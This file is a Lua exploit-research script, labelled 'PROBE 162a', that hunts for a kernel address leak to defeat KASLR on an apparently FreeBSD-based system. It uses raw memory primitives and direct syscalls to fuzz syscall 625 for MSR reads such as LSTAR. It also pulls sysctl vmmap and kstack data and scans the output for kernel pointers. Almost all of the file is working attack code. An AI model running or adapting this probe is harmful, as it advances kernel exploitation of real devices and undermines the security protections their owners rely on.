-- CRASH_CLASS: LOW
-- PROBE 162a: KASLR info leak hunt
-- Strategy 1: sys 625 cmd 13 might be rdmsr — test all indices/domains
-- Strategy 2: sysctl kern.proc.vmmap might leak kernel addresses
-- Strategy 3: sysctl kern.proc.kstack might leak kernel stack addresses

print("=== PROBE 162a: KASLR LEAK HUNT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc625 = make_syscall(625)
local sc202 = make_syscall(202)  -- __sysctl
local sc20  = make_syscall(20)   -- getpid

local ok, pid_raw = pcall(function() return sc20() end)
local pid = ok and to_num(pid_raw) or 0
print("PID: " .. pid)
print("")

-- ============================================================
-- STRATEGY 1: sys 625 cmd 13 rdmsr exploration
-- cmd 13 returned 0 with domain=1 idx=0. Maybe it's reading
-- MSR value and the MSR was 0. Try all indices 0-7 with all
-- domains, AND check if the syscall return value contains the
-- MSR data (FreeBSD syscalls return in rax).
-- ============================================================
print("=== STRATEGY 1: sys 625 cmd 13 (potential rdmsr) ===")
print("")

-- Full matrix: cmd 13 x domain 0-3 x index 0-7
print("[1a] cmd=13, all domains x indices:")
for dom = 0, 3 do
    local line = "  dom=" .. dom .. ":"
    for idx = 0, 7 do
        local ok1, rv = pcall(function()
            return sc625(uint64(13), uint64(dom), uint64(idx), uint64(0))
        end)
        if ok1 then
            line = line .. " i" .. idx .. "=" .. fmt(rv)
        else
            line = line .. " i" .. idx .. "=FAIL"
        end
    end
    print(line)
end
print("")

-- Try cmd 13 with a non-zero value arg (maybe it's the MSR address)
print("[1b] cmd=13 dom=1 idx=0, value = MSR address to read:")
local test_msrs = {
    {0xC0000082, "LSTAR"},
    {0xC0000080, "EFER"},
    {0xC0000081, "STAR"},
    {0xC0000083, "CSTAR"},
    {0xC0000100, "FS_BASE"},
    {0xC0000101, "GS_BASE"},
    {0xC0000102, "KernelGSBase"},
    {0x10, "TSC"},
    {0x1B, "APIC_BASE"},
    {0x174, "SYSENTER_CS"},
    {0x175, "SYSENTER_ESP"},
    {0x176, "SYSENTER_EIP"},
}
for _, m in ipairs(test_msrs) do
    local ok2, rv = pcall(function()
        return sc625(uint64(13), uint64(1), uint64(0), uint64(m[1]))
    end)
    if ok2 then
        print(string.format("  MSR 0x%X (%s): ret=%s", m[1], m[2], fmt(rv)))
    else
        print(string.format("  MSR 0x%X (%s): FAIL", m[1], m[2]))
    end
end
print("")

-- Try ALL commands 1-23 with domain=1 idx=0 value=LSTAR
-- Maybe a different cmd is the read
print("[1c] All cmds, dom=1, idx=0, value=0xC0000082 (LSTAR addr):")
for cmd = 1, 23 do
    local ok3, rv = pcall(function()
        return sc625(uint64(cmd), uint64(1), uint64(0), uint64(0xC0000082))
    end)
    if ok3 then
        local h, l = get_hi_lo(rv)
        local tag = ""
        if h >= 0xFFFF8000 then tag = " <<< KERNEL PTR?" end
        if l ~= 0 or h ~= 0 then tag = tag .. " <<< NON-ZERO" end
        print(string.format("  cmd=%2d: ret=%s%s", cmd, fmt(rv), tag))
    else
        print(string.format("  cmd=%2d: FAIL", cmd))
    end
end
print("")

-- ============================================================
-- STRATEGY 2: sysctl kern.proc.vmmap
-- MIB: {CTL_KERN=1, KERN_PROC=14, KERN_PROC_VMMAP=32, pid}
-- Returns kinfo_vmentry structs with kve_start/kve_end
-- ============================================================
print("=== STRATEGY 2: sysctl vmmap ===")
print("")

local mib = memory.alloc(32)
local oldlen_buf = memory.alloc(8)
local data_buf = memory.alloc(0x10000)  -- 64KB buffer

-- kern.proc.vmmap.<pid>
memory.write_dword(mib, 1)       -- CTL_KERN
memory.write_dword(mib + 4, 14)  -- KERN_PROC
memory.write_dword(mib + 8, 32)  -- KERN_PROC_VMMAP
memory.write_dword(mib + 12, pid)

-- First: query size needed (pass NULL, 0)
memory.write_qword(oldlen_buf, uint64(0x10000))
local ok4, rv4 = pcall(function()
    return sc202(uint64(mib), uint64(4), uint64(data_buf), uint64(oldlen_buf), uint64(0), uint64(0))
end)
print("[2a] vmmap sysctl: ret=" .. (ok4 and fmt(rv4) or "FAIL"))
if ok4 then
    local data_len = to_num(memory.read_qword(oldlen_buf))
    print("  data length: " .. data_len .. " bytes")

    if data_len > 0 then
        -- Scan for kernel-range addresses (0xFFFFFFFF8...)
        -- kinfo_vmentry has kve_start at offset 0, kve_end at offset 8
        -- struct size varies but is typically 0x488 on FreeBSD 13
        local entry_count = 0
        local kernel_addrs = {}
        -- Scan raw qwords looking for kernel addresses
        local scan_limit = math.min(data_len, 0x10000)
        for off = 0, scan_limit - 8, 8 do
            local qval = memory.read_qword(data_buf + off)
            local h, l = get_hi_lo(qval)
            if h >= 0xFFFF8000 and h <= 0xFFFFFFFF then
                kernel_addrs[#kernel_addrs + 1] = string.format("  off=0x%04X: 0x%X%08X", off, h, l)
            end
        end
        if #kernel_addrs > 0 then
            print("  KERNEL ADDRESSES FOUND:")
            for _, a in ipairs(kernel_addrs) do
                print(a)
            end
        else
            print("  No kernel addresses found in vmmap data")
        end

        -- Print first few entries anyway (first 256 bytes as hex)
        print("  First 128 bytes (hex dump):")
        for off = 0, math.min(127, scan_limit - 8), 8 do
            local qval = memory.read_qword(data_buf + off)
            local h, l = get_hi_lo(qval)
            print(string.format("    +0x%03X: 0x%08X%08X", off, h, l))
        end
    end
end
print("")

-- ============================================================
-- STRATEGY 2b: kern.proc.kstack
-- MIB: {1, 14, 35, pid}  — kernel stack trace
-- ============================================================
print("=== STRATEGY 2b: sysctl kstack ===")

memory.write_dword(mib, 1)       -- CTL_KERN
memory.write_dword(mib + 4, 14)  -- KERN_PROC
memory.write_dword(mib + 8, 35)  -- KERN_PROC_KSTACK
memory.write_dword(mib + 12, pid)

memory.write_qword(oldlen_buf, uint64(0x10000))
-- Zero data buffer
for i = 0, 255, 8 do
    memory.write_qword(data_buf + i, uint64(0))
end

local ok5, rv5 = pcall(function()
    return sc202(uint64(mib), uint64(4), uint64(data_buf), uint64(oldlen_buf), uint64(0), uint64(0))
end)
print("[2b] kstack sysctl: ret=" .. (ok5 and fmt(rv5) or "FAIL"))
if ok5 then
    local data_len = to_num(memory.read_qword(oldlen_buf))
    print("  data length: " .. data_len .. " bytes")
    if data_len > 0 then
        -- kstack returns text with kernel addresses in it
        -- Read as string
        local parts = {}
        for off = 0, math.min(data_len - 1, 2047) do
            local ok_b, b = pcall(function() return memory.read_byte(data_buf + off) end)
            if ok_b and b ~= 0 then
                parts[#parts + 1] = string.char(b)
            elseif b == 0 then
                break
            end
        end
        local text = table.concat(parts)
        print("  kstack output:")
        print(text)
    end
end
print("")

-- ============================================================
-- STRATEGY 3: check other sysctl for kernel info
-- ============================================================
print("=== STRATEGY 3: other sysctl leaks ===")

local sysctl_tests = {
    {{1, 37},      2, "kern.features"},
    {{1, 27},      2, "kern.osreldate"},
    {{1, 40},      2, "kern.proc.pathnames"},
    {{6, 1},       2, "hw.machine"},
    {{6, 2},       2, "hw.model"},
    {{0, 3},       2, "sysctl.name2oid"},
}
for _, st in ipairs(sysctl_tests) do
    local mib_vals, mib_len, name = st[1], st[2], st[3]
    for i, v in ipairs(mib_vals) do
        memory.write_dword(mib + (i-1)*4, v)
    end
    memory.write_qword(oldlen_buf, uint64(0x1000))
    for i = 0, 63, 8 do memory.write_qword(data_buf + i, uint64(0)) end

    local ok6, rv6 = pcall(function()
        return sc202(uint64(mib), uint64(mib_len), uint64(data_buf), uint64(oldlen_buf), uint64(0), uint64(0))
    end)
    if ok6 then
        local dlen = to_num(memory.read_qword(oldlen_buf))
        local h, l = get_hi_lo(rv6)
        -- Check first 8 bytes
        local val = memory.read_qword(data_buf)
        local vh, vl = get_hi_lo(val)
        local tag = ""
        if vh >= 0xFFFF8000 then tag = " <<< KERNEL?" end
        print(string.format("  %-20s ret=%s len=%d val=%s%s", name, fmt(rv6), dlen, fmt(val), tag))
    else
        print(string.format("  %-20s FAIL", name))
    end
end

print("")
print("=== PROBE 162a COMPLETE ===")
